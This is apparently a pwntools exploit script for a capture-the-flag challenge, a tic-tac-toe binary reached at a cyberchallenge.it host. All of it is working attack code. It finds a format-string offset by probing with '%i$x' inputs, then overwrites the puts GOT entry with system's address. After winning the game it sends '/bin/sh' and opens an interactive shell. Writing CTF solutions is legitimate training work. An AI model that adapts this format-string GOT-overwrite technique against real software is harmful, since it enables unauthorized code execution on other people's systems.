from pwn import *

BIN: str = './tictactoe'
HOST: str = 'tictactoe.challs.cyberchallenge.it'
PORT: int = 9132

def get_target():
  if args.REMOTE:
    return connect(HOST, PORT)
  else:
    return process(BIN)

def search_offset(app, data):
  offset = 0
  app.clean()

  for i in range(256):
    fmt = f"{data}%{i}$x"
    app.sendline(fmt)
    res = app.recvline()
    # print(data.encode().hex(), res)
    if data.encode().hex().encode() in res:
      offset = i
      break
      
  return offset


def main():
  app = get_target()
  elf = ELF(BIN)
  addr_offset = search_offset(app, 'AAAA')
  fmt_str = fmtstr_payload(addr_offset, {elf.got.puts: elf.plt.system})
  app.recvuntil(b"Your move: ")
  app.sendline(fmt_str)
  
  for i in range(1, 10):
    line = app.recvuntil([b"Your move: ", b"win", b"won"])
    if b"You win" in line:
      app.sendline(b"/bin/sh")
      app.interactive()
    elif b"I won" in line:
      print("Retry...")
      return
    else:
      app.sendline(str(i).encode())



if __name__ == "__main__":
  main()